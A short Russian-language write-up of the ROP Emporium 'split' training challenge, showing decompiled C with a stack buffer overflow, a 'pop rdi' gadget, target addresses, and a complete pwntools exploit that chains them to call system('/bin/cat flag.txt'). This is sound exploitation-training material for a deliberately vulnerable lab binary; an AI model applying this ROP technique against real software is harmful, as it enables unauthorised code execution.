Архив с задачей: https://ropemporium.com/binary/split.zip

Исходный код:
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, nullptr, 2, 0);
  puts("split by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
}

void pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0, s, 96u);
  puts("Thank you!");
}

int usefulFunction() // 0x400742
{
  return system("/bin/ls");
}
```

Гаджеты:
```
0x00000000004007c3 : pop rdi ; ret
```

Другие важные ссылки:
```
.data:0000000000601060 usefulString    db '/bin/cat flag.txt',0
.text:000000000040074B                 call    _system
```

Необходимо перетереть буфер и адрес возврата. ROP-цепочка должна настроить регистр `rdi`, чтобы в нём находилась строка `/bin/cat flag.txt`, а затем вызвать `system`.

Эксплоит:
``` python
pop_rdi = 0x4007c3
cat_flag = 0x601060
system = 0x40074B

io = start()

payload = b'A' * 32 + b'B' * 8
payload += p64(pop_rdi) + p64(cat_flag)
payload += p64(system)
io.sendline(payload)

io.interactive()
```
